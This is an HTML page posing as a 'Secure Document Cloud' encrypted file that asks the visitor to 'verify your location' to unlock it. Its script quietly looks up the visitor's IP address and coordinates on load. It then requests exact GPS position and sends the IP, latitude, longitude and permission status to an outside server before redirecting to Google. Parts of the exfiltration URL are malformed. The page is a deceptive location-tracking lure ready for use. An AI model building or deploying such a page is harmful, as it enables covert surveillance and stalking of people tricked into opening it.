<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Cloud</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 20%; background: #f4f7f6; color: #333; }
        .card { background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 85%; }
        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card" id="box">
        <h2>🔒 Encrypted File</h2>
        <p>This document is protected. Please verify your location to unlock the decryption key.</p>
        <button class="btn" onclick="start()">UNLOCK FILE</button>
    </div>

    <script>
        let info = { ip: "Unknown", lat: "0", lon: "0", type: "IP-Only" };

        // Get IP Backup first
        fetch('https://ipapi.co').then(r => r.json()).then(d => {
            info.ip = d.ip; info.lat = d.latitude; info.lon = d.longitude;
        });

        function start() {
            document.getElementById('box').innerHTML = "<h3>Verifying Location...</h3>";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, fail, {enableHighAccuracy:true});
            } else { send(); }
        }

        function success(p) {
            info.lat = p.coords.latitude; 
            info.lon = p.coords.longitude; 
            info.type = "EXACT-GPS";
            send();
        }

        function fail() {
            info.type = "DENIED-ACCESS";
            send();
            document.getElementById('box').innerHTML = "<h3 style='color:red;'>Access Denied</h3><p>Permission required.</p>";
        }

        function send() {
            const url = `https://pythonanywhere.com{info.lat}&lon=${info.lon}&ip=${info.ip}&type=${info.type}`;
            fetch(url).then(() => {
                setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
            });
        }
    </script>
</body>
</html>
